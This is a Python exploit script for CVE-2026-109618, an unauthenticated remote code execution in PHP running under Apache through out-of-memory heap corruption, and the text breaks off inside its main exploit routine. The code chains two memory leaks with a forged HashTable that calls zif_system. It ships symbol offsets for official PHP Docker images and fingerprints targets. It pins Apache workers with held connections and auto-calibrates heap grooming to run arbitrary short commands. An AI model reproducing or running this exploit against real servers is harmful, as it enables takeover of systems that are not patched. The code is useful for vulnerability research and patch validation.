#!/usr/bin/env python3
"""
CVE-2026-109618 -- Unauthenticated RCE via OOM heap corruption.

Three-stage exploit chain:
  Stage 1: Leak Zend MM chunk base via 4096-byte PHPSESSID cookie
  Stage 2: Leak libphp.so load base via 16-byte PHPSESSID cookie
  Stage 3: Fake HashTable redirects pDestructor to zif_system

Handles multi-worker Apache prefork (worker pinning), auto-detects
memory_limit, auto-calibrates heap grooming parameters at runtime,
and ships with a profile table covering official php:*-apache images.

For authorized security research and local lab use only.
"""

from __future__ import annotations

import argparse
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter

# ---------------------------------------------------------------------------
# Build profiles: php version + arch -> libphp symbol offsets
# ---------------------------------------------------------------------------
PROFILES: dict[str, dict] = {
    # Official php:*-apache Docker images (bookworm, verified RCE)
    "8.4.26-amd64": {
        "zif_system": 0x465370, "zval_ptr_dtor": 0x65EB60,
        "htdata_candidates": [0x690D8],
        "stage1_n": 841, "stage1_forge_len": 79,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    "8.4.25-aarch64": {
        "zif_system": 0x42FA30, "zval_ptr_dtor": 0x637AE0,
        "htdata_candidates": [0x690D8],
        "stage1_n": 841, "stage1_forge_len": 79,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    "8.5.11-amd64": {
        "zif_system": 0x5996E0, "zval_ptr_dtor": 0x7B47A0,
        "htdata_candidates": [0x690D8],
        "stage1_n": 841, "stage1_forge_len": 63,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    "8.5.11-aarch64": {
        "zif_system": 0x5314F0, "zval_ptr_dtor": 0x761B80,
        "htdata_candidates": [0x690D8],
        "stage1_n": 841, "stage1_forge_len": 63,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    "8.5.10-aarch64": {
        "zif_system": 0x52E130, "zval_ptr_dtor": 0x75D360,
        "htdata_candidates": [0x690D8],
        "stage1_n": 841, "stage1_forge_len": 63,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    # Offset-only (no verified stage3, but stages 1+2 should work)
    "8.5.0-amd64": {
        "zif_system": 0x503510, "zval_ptr_dtor": 0x731D80,
        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
        "stage1_n": 841, "stage1_forge_len": 63,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
    "8.3.0-amd64": {
        "zif_system": 0x3771F0, "zval_ptr_dtor": 0x467CF0,
        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
        "stage1_n": 0, "stage1_forge_len": 0,
        "stage2_t": 406, "stage2_v": 16,
        "stage3_pads_bookworm": [(31, 31)] * 6,
        "stage3_carrier": True,
    },
}

FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}

HT_LEN = 167
MAX_CMD = 14
SID = b"attacksessionid0001"
BOUNDARY_A = b"S" * 17
BOUNDARY_B = b"B" * 10
BOUNDARY_R = b"BNDRY12345"

STAGE3_PADS_BOOKWORM = [(31, 31)] * 6
STAGE3_PADS_LAB = [(8, 7)] + [(7, 7)] * 5
HTDATA_CANDIDATES = [0x690D8, 0x6E0D8, 0x5404A]


# ---------------------------------------------------------------------------
# Multipart builder
# ---------------------------------------------------------------------------
def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# ---------------------------------------------------------------------------
# HTTP transport
# ---------------------------------------------------------------------------
def send_post(host: str, port: int, path: str, body: bytes, boundary: bytes,
              timeout: float = 120.0, extra_headers: dict | None = None) -> bytes | None:
    extra = ""
    for k, v in (extra_headers or {}).items():
        extra += f"{k}: {v}\r\n"
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"{extra}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        data = bytearray()

        def _reader():
            try:
                while len(data) < (1 << 20):
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            sock.sendall(hdr)
            mv = memoryview(body)
            for off in range(0, len(body), 262144):
                sock.sendall(mv[off:off + 262144])
        except OSError:
            pass
        reader.join(timeout=timeout + 1.0)
        return bytes(data)
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return None


def send_raw(host: str, port: int, data: bytes, timeout: float = 10.0) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    out = bytearray()
    try:
        s.connect((host, port))
        s.sendall(data)
        while len(out) < 65536:
            chunk = s.recv(65536)
            if not chunk:
                break
            out.extend(chunk)
    except OSError:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    return bytes(out)


def parse_cookie(resp: bytes | None) -> bytes:
    if not resp:
        return b""
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            raw = line.split(b"PHPSESSID=")[1].split(b";")[0]
            try:
                return urllib.parse.unquote_to_bytes(raw.decode("latin-1"))
            except Exception:
                return raw
    return b""


# ---------------------------------------------------------------------------
# Fingerprinting and profiling
# ---------------------------------------------------------------------------
def fingerprint(host: str, port: int, path: str) -> str:
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Connection: close\r\n\r\n").encode()
    resp = send_raw(host, port, req, timeout=10)
    m = re.search(rb"X-Powered-By:\s*PHP/(\d+\.\d+\.\d+)", resp, re.IGNORECASE)
    if m:
        return m.group(1).decode()
    m = re.search(rb"PHP/(\d+\.\d+\.\d+)", resp)
    if m:
        return m.group(1).decode()
    return ""


def is_patched(version: str) -> bool:
    parts = version.split(".")
    if len(parts) < 3:
        return False
    branch = f"{parts[0]}.{parts[1]}"
    minor = int(parts[2])
    fixed = FIXED.get(branch)
    if fixed is None:
        return False
    return minor >= fixed


def select_profile(version: str, arch: str = "amd64") -> dict | None:
    key = f"{version}-{arch}"
    if key in PROFILES:
        return PROFILES[key]
    branch = ".".join(version.split(".")[:2])
    for pkey, prof in PROFILES.items():
        if pkey.endswith(f"-{arch}"):
            pver = pkey.rsplit("-", 1)[0]
            pbranch = ".".join(pver.split(".")[:2])
            if pbranch == branch:
                return prof
    return None


# ---------------------------------------------------------------------------
# ELF symbol extraction (for --extract-offsets)
# ---------------------------------------------------------------------------
def parse_elf_offsets(path: str) -> dict:
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not a little-endian ELF64 file")
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    SHT_SYMTAB, SHT_DYNSYM = 2, 11
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        _, sh_type = struct.unpack_from("<II", data, off)
        sh_offset, sh_size = struct.unpack_from("<QQ", data, off + 24)
        sh_link = struct.unpack_from("<I", data, off + 40)[0]
        sh_entsize = struct.unpack_from("<Q", data, off + 56)[0]
        sections.append({"type": sh_type, "offset": sh_offset, "size": sh_size,
                         "link": sh_link, "entsize": sh_entsize})
    wanted = {"zif_system": None, "zval_ptr_dtor": None}
    for sec in sections:
        if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        if sec["link"] >= len(sections):
            continue
        strtab = sections[sec["link"]]
        entsize = sec["entsize"] or 24
        for i in range(sec["size"] // entsize):
            off = sec["offset"] + i * entsize
            st_name = struct.unpack_from("<I", data, off)[0]
            st_value = struct.unpack_from("<Q", data, off + 8)[0]
            if not st_name:
                continue
            name_off = strtab["offset"] + st_name
            end = data.find(b"\x00", name_off)
            if end < 0:
                continue
            name = data[name_off:end].decode("ascii", "replace")
            if name in wanted and wanted[name] is None:
                wanted[name] = st_value
    return wanted


def extract_offsets_from_container(container: str, docker_cmd: str = "sg docker -c") -> dict | None:
    import tempfile, os
    lib_paths = [
        "/usr/lib/apache2/modules/libphp.so",
        "/usr/lib/apache2/modules/libphp7.so",
    ]
    for lib_path in lib_paths:
        with tempfile.NamedTemporaryFile(suffix=".so", delete=False) as tmp:
            tmp_path = tmp.name
        cmd = f'{docker_cmd} "docker cp {container}:{lib_path} {tmp_path}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        if result.returncode == 0 and os.path.getsize(tmp_path) > 0:
            try:
                syms = parse_elf_offsets(tmp_path)
                return syms
            finally:
                os.unlink(tmp_path)
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
    return None


# ---------------------------------------------------------------------------
# Memory limit detection
# ---------------------------------------------------------------------------
def probe_memory_limit(host: str, port: int, path: str) -> int | None:
    for mb in (16, 64, 256):
        body = b"big=" + b"A" * (mb * 1024 * 1024)
        hdr = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        resp = bytearray()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            s.connect((host, port))
            s.sendall(hdr)
            s.sendall(body)
            while len(resp) < 65536:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp.extend(chunk)
            s.close()
        except OSError:
            continue
        m = re.search(rb"Allowed memory size of (\d+) bytes", resp)
        if m:
            return max(1, int(m.group(1)) // (1024 * 1024))
        if b"413" in resp[:50] or b"Request Entity Too Large" in resp:
            return None
    return None


# ---------------------------------------------------------------------------
# Worker pinning
# ---------------------------------------------------------------------------
def hold_workers(host: str, port: int, path: str, count: int) -> list[socket.socket]:
    holders = []
    for i in range(count):
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(
                f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 1048576\r\n\r\nx".encode()
            )
            holders.append(s)
        except OSError:
            break
        time.sleep(0.01)
    time.sleep(0.8)
    return holders


def auto_detect_workers(host: str, port: int, path: str,
                        max_probe: int = 200) -> int:
    """Saturate the worker pool to discover how many workers exist.

    Sends incomplete POST requests one at a time to hold workers.
    After each, probes with a timed GET. When the GET fails to get
    a response within the timeout, all workers are busy.
    """
    socks: list[socket.socket] = []
    for _ in range(max_probe):
        try:
            s = socket.create_connection((host, port), timeout=3)
            s.sendall(
                f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 1048576\r\n\r\nx".encode()
            )
            socks.append(s)
        except (OSError, socket.timeout):
            break
        time.sleep(0.05)
        alive = False
        try:
            probe = socket.create_connection((host, port), timeout=2)
            probe.sendall(
                f"GET {path} HTTP/1.0\r\nHost: {host}:{port}\r\n\r\n".encode())
            probe.settimeout(2)
            data = probe.recv(256)
            alive = b"HTTP/" in data
            probe.close()
        except (OSError, socket.timeout):
            alive = False
        if not alive:
            break
    count = len(socks)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    time.sleep(1.0)
    return count


# ---------------------------------------------------------------------------
# Common parts
# ---------------------------------------------------------------------------
def file_part() -> dict:
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}


def big_field(huge_mb: int) -> dict:
    return {"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)}


# ---------------------------------------------------------------------------
# Worker rotation
# ---------------------------------------------------------------------------
def rotate(host: str, port: int, path: str, huge_mb: int):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(huge_mb),
    ]
    send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
              timeout=90)
    time.sleep(0.3)
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    send_post(host, port, path, build_multipart(parts, BOUNDARY_R), BOUNDARY_R,
              timeout=20)
    time.sleep(0.5)


# ---------------------------------------------------------------------------
# Stage 1: chunk base leak
# ---------------------------------------------------------------------------
def stage1_oom(host: str, port: int, path: str, huge_mb: int) -> bytes | None:
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(huge_mb),
    ]
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90)


def stage1_leak(host: str, port: int, path: str,
                n: int, forge_len: int) -> bytes:
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_len)
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=30)
    return parse_cookie(resp)


# ---------------------------------------------------------------------------
# Stage 2: libphp base leak
# ---------------------------------------------------------------------------
def stage2_oom(host: str, port: int, path: str, huge_mb: int) -> bytes | None:
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        file_part(),
        big_field(huge_mb),
    ]
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90)


def stage2_leak(host: str, port: int, path: str,
                t_index: int, v_count: int) -> bytes:
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(983):
        cnt = v_count if i == t_index else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=60)
    return parse_cookie(resp)


# ---------------------------------------------------------------------------
# Stage 3: RCE
# ---------------------------------------------------------------------------
def build_fake_payload(htdata: int, zif: int, cmd: bytes) -> bytes:
    ht = bytearray(b"\x00" * HT_LEN)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def stage3_oom(host: str, port: int, path: str, huge_mb: int,
               pads: list[tuple[int, int]]) -> bytes | None:
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(pads):
        name = f"p{i:0{nl - 1}d}"[:nl] if nl > 0 else ""
        parts.append({"name": name, "data": b"V" * vl})
    parts += [file_part(), big_field(huge_mb)]
    extra = {"Cookie": "PHPSESSID=" + "a" * 32}
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_A), BOUNDARY_A,
                     timeout=90, extra_headers=extra)


def stage3_spray(host: str, port: int, path: str,
                 htdata: int, zif: int, cmd: bytes,
                 carrier: bool) -> bytes | None:
    ht = build_fake_payload(htdata, zif, cmd)
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    if carrier:
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
        c = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
        parts.append({"name": "g00", "data": c})
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    else:
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": bytes(ref)})
    return send_post(host, port, path, build_multipart(parts, BOUNDARY_B), BOUNDARY_B,
                     timeout=30)


# ---------------------------------------------------------------------------
# Leak analysis
# ---------------------------------------------------------------------------
def find_chunk_base(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c: Counter = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def find_libphp_base(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ---------------------------------------------------------------------------
# Auto-calibration
# ---------------------------------------------------------------------------
def calibrate_stage1(host: str, port: int, path: str, huge_mb: int,
                     profile: dict, retries: int = 3) -> tuple[int, int]:
    """Discover STAGE1_N and forge_len at runtime.

    Probe with N=900 grooming fields. The leaked cookie contains the value
    of whichever field landed in the stale PS(id) slot (e.g. v0841).
    Parse that index and sweep forge_len.
    """
    for attempt in range(retries):
        if attempt > 0:
            rotate(host, port, path, huge_mb)
        resp_a = stage1_oom(host, port, path, huge_mb)
        if not resp_a:
            continue
        time.sleep(0.2)
        cookie = stage1_leak(host, port, path, 900, 48)
        if len(cookie) < 4:
            continue
        m = re.search(rb"v(\d{4})", cookie)
        if m:
            index = int(m.group(1))
            print(f"  [calibrate] stage1 probe: stale block at v{index:04d}")
            for forge_len in (63, 79, 87, 95):
                rotate(host, port, path, huge_mb)
                resp_a2 = stage1_oom(host, port, path, huge_mb)
                if not resp_a2:
                    continue
                time.sleep(0.2)
                cookie2 = stage1_leak(host, port, path, index, forge_len)
                base = find_chunk_base(cookie2)
                if base and len(cookie2) >= 1000:
                    print(f"  [calibrate] N={index} forge_len={forge_len} -> {len(cookie2)}B cookie")
                    return index, forge_len
            return index, profile.get("stage1_forge_len", 79)
    return profile.get("stage1_n", 841), profile.get("stage1_forge_len", 79)


def calibrate_stage2(host: str, port: int, path: str, huge_mb: int,
                     dtor_offset: int, profile: dict) -> int:
    """Sweep T values to find which sub-array index leaks the dtor pointer."""
    hint = profile.get("stage2_t", 406)
    candidates = [hint] + [t for t in range(350, 461) if t != hint]
    for t in candidates:
        rotate(host, port, path, huge_mb)
        resp_a = stage2_oom(host, port, path, huge_mb)
        if not resp_a:
            continue
        time.sleep(0.2)
        cookie = stage2_leak(host, port, path, t, profile.get("stage2_v", 16))
        base = find_libphp_base(cookie, dtor_offset)
        if base:
            print(f"  [calibrate] stage2 T={t} -> libphp={hex(base)}")
            return t
    return hint


# ---------------------------------------------------------------------------
# Proof verification
# ---------------------------------------------------------------------------
def check_proof_container(container: str, proof_file: str,
                          docker_cmd: str = "sg docker -c") -> str | None:
    try:
        cmd = f'{docker_cmd} "docker exec {container} cat {proof_file}"'
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.strip()
    except Exception:
        pass
    return None


def check_proof_http(host: str, port: int, proof_path: str) -> str | None:
    req = (f"GET {proof_path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Connection: close\r\n\r\n").encode()
    resp = send_raw(host, port, req, timeout=5)
    if b"200 OK" in resp[:50]:
        _, _, body = resp.partition(b"\r\n\r\n")
        if body.strip():
            return body.strip().decode("latin-1", "replace")
    return None


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618: Unauthenticated RCE via OOM heap corruption.",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-u", "--target", required=True,
                    help="target URL (e.g. http://127.0.0.1:8896/index.php)")
    ap.add_argument("-c", "--command", default="id>/tmp/pwned",
                    help="command to execute (max 14 bytes, default: id>/tmp/pwned)")
    ap.add_argument("--workers", type=int, default=0,
                    help="worker count (0 = auto-detect, 1 = skip pinning)")
    ap.add_argument("--memory-limit", type=int, default=0,
                    help="memory_limit in MB (0 = auto-detect)")
    ap.add_argument("--profile", default=None,
                    help="force a build profile key (e.g. 8.4.26-amd64)")
    ap.add_argument("--container", default=None,
                    help="Docker container name for proof check")
    ap.add_argument("--retries", type=int, default=3,
                    help="retry count per stage")
    ap.add_argument("--no-calibrate", action="store_true",
                    help="skip auto-calibration, use profile defaults")
    ap.add_argument("--extract-offsets", action="store_true",
                    help="extract symbol offsets from container's libphp.so")
    ap.add_argument("--php-version", default=None,
                    help="override PHP version detection")
    ap.add_argument("--proof-file", default="/tmp/pwned",
                    help="proof file path inside the target")
    ap.add_argument("--fetch", default=None,
                    help="HTTP path to fetch proof from (e.g. /pwned)")
    ap.add_argument("--docker-cmd", default="sg docker -c",
                    help="docker command prefix")
    args = ap.parse_args()

    u = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/index.php"

    cmd_bytes = args.command.encode()
    if len(cmd_bytes) > MAX_CMD:
        print(f"[!] command too long ({len(cmd_bytes)}B > {MAX_CMD}B)")
        return 1

    print("=" * 60)
    print("CVE-2026-109618: Unauthenticated RCE")
    print("=" * 60)
    print(f"Target:  {host}:{port}{path}")
    print(f"Command: {args.command}")
    print()

    # --- Step 1: Fingerprint ---
    print("[1/6] Fingerprint")
    version = args.php_version or fingerprint(host, port, path)
    if version:
        print(f"  PHP version: {version}")
        if is_patched(version):
            print(f"  [!] PHP {version} is PATCHED. Exploit will not work.")
            return 1
    else:
        print("  [!] Could not detect PHP version")
        if not args.profile:
            print("  Use --php-version or --profile to specify manually")
            return 1

    profile = None
    if args.profile:
        profile = PROFILES.get(args.profile)
        if not profile:
            print(f"  [!] Unknown profile: {args.profile}")
            print(f"  Available: {', '.join(sorted(PROFILES.keys()))}")
            return 1
        print(f"  Profile: {args.profile}")
    elif version:
        profile = select_profile(version)
        if profile:
            print(f"  Profile matched")
        else:
            print(f"  [!] No profile for PHP {version}")

    if args.extract_offsets and args.container:
        print(f"  Extracting offsets from {args.container}...")
        syms = extract_offsets_from_container(args.container, args.docker_cmd)
        if syms and syms.get("zif_system") and syms.get("zval_ptr_dtor"):
            if not profile:
                profile = {}
            profile["zif_system"] = syms["zif_system"]
            profile["zval_ptr_dtor"] = syms["zval_ptr_dtor"]
            print(f"  zif_system:    {hex(syms['zif_system'])}")
            print(f"  zval_ptr_dtor: {hex(syms['zval_ptr_dtor'])}")
        else:
            print("  [!] Could not extract offsets")

    if not profile or not profile.get("zif_system") or not profile.get("zval_ptr_dtor"):
        print("  [!] No symbol offsets available. Cannot proceed.")
        print("  Use --profile, --extract-offsets, or --php-version")
        return 1

    dtor_offset = profile["zval_ptr_dtor"]
    zif_offset = profile["zif_system"]
    htdata_candidates = profile.get("htdata_candidates", HTDATA_CANDIDATES)
    print()

    # --- Step 2: Probe memory_limit ---
    print("[2/6] Memory limit")
    if args.memory_limit > 0:
        mem_mb = args.memory_limit
        print(f"  Using provided: {mem_mb}M")
    else:
        print("  Probing...")
        mem_mb = probe_memory_limit(host, port, path)
        if mem_mb:
            print(f"  Detected: {mem_mb}M")
        else:
            print("  Could not detect. Sweeping common values.")
            mem_mb = None

    mem_limits = [mem_mb] if mem_mb else [8, 16, 32, 64, 128, 256]
    print()

    # --- Step 3: Pin workers ---
    print("[3/6] Worker pinning")
    holders: list[socket.socket] = []
    worker_count = args.workers if args.workers > 0 else 1
    if args.workers == 1:
        print("  Single worker mode (no pinning)")
    elif args.workers > 1:
        n_hold = args.workers - 1
        print(f"  Pinning {n_hold} of {args.workers} workers...")
        holders = hold_workers(host, port, path, n_hold)
        print(f"  Pinned {len(holders)} workers")
    else:
        print("  Auto-detecting worker count...")
        worker_count = auto_detect_workers(host, port, path)
        print(f"  Detected {worker_count} workers")
        if worker_count > 1:
            n_hold = worker_count - 1
            print(f"  Pinning {n_hold} workers...")
            holders = hold_workers(host, port, path, n_hold)
            print(f"  Pinned {len(holders)} workers")
        else:
            print("  Single worker, no pinning needed")
    print()

    try:
        for mem_mb in mem_limits:
            huge_mb = mem_mb + 12
            if len(mem_limits) > 1:
                print(f"--- Trying memory_limit={mem_mb}M (huge={huge_mb}M) ---")

            # --- Step 4: Calibrate ---
            if not args.no_calibrate:
                print("[4/6] Auto-calibration")
                stage1_n, forge_len = calibrate_stage1(
                    host, port, path, huge_mb, profile, args.retries)
                print(f"  stage1_n={stage1_n} forge_len={forge_len}")

                rotate(host, port, path, huge_mb)
                stage2_t = calibrate_stage2(
                    host, port, path, huge_mb, dtor_offset, profile)
                print(f"  stage2_t={stage2_t}")
                stage2_v = profile.get("stage2_v", 16)

                if holders:
                    print("  Refreshing workers after calibration...")
                    for s in holders:
                        try:
                            s.close()
                        except OSError:
                            pass
                    holders.clear()
                    time.sleep(2.0)
                    n_hold = (args.workers if args.workers > 1
                              else worker_count) - 1
                    holders = hold_workers(host, port, path, n_hold)
                    print(f"  Re-pinned {len(holders)} workers")
                print()
            else:
                print("[4/6] Using profile defaults (no calibration)")
                stage1_n = profile.get("stage1_n", 841)
                forge_len = profile.get("stage1_forge_len", 79)
                stage2_t = profile.get("stage2_t", 406)
                stage2_v = profile.get("stage2_v", 16)
                print(f"  stage1_n={stage1_n} forge_len={forge_len} stage2_t={stage2_t}")
                print()

            if stage1_n == 0:
                print("  [!] stage1_n not calibrated, skipping this memory_limit")
                continue

            # --- Step 5: Exploit ---
            result = run_exploit(
                host, port, path, huge_mb,
                stage1_n, forge_len, stage2_t, stage2_v,
                dtor_offset, zif_offset, htdata_candidates,
                cmd_bytes, profile, args)
            if result == 0:
                return 0
            if len(mem_limits) > 1:
                print(f"  memory_limit={mem_mb}M did not succeed")
                print()

        print()
        print("[!] All attempts failed")
        return 1
    finally:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass


def run_exploit(host, port, path, huge_mb,
                stage1_n, forge_len, stage2_t, stage2_v,
                dtor_offset, zif_offset, htdata_candidates,
                cmd_bytes, profile, args) -> int:
    retries = args.retries

    for attempt in range(1, retries + 1):
        print(f"[5/6] Exploit chain (attempt {attempt}/{retries})")

        # Stage 1
        print("  Stage 1: chunk base leak")
        rotate(host, port, path, huge_mb)
        resp = stage1_oom(host, port, path, huge_mb)
        if not resp or b"Allowed memory size" not in resp:
            print("    [!] OOM not triggered")
            continue
        time.sleep(0.2)
        cookie = stage1_leak(host, port, path, stage1_n, forge_len)
        chunk_base = find_chunk_base(cookie)
        if not chunk_base:
            print(f"    [!] No chunk base (cookie={len(cookie)}B)")
            continue
        print(f"    chunk_base = {hex(chunk_base)}")

        # Stage 2
        print("  Stage 2: libphp base leak")
        rotate(host, port, path, huge_mb)
        resp = stage2_oom(host, port, path, huge_mb)
        if not resp or b"Allowed memory size" not in resp:
            print("    [!] OOM not triggered")
            continue
        time.sleep(0.2)
        cookie = stage2_leak(host, port, path, stage2_t, stage2_v)
        libphp_base = find_libphp_base(cookie, dtor_offset)
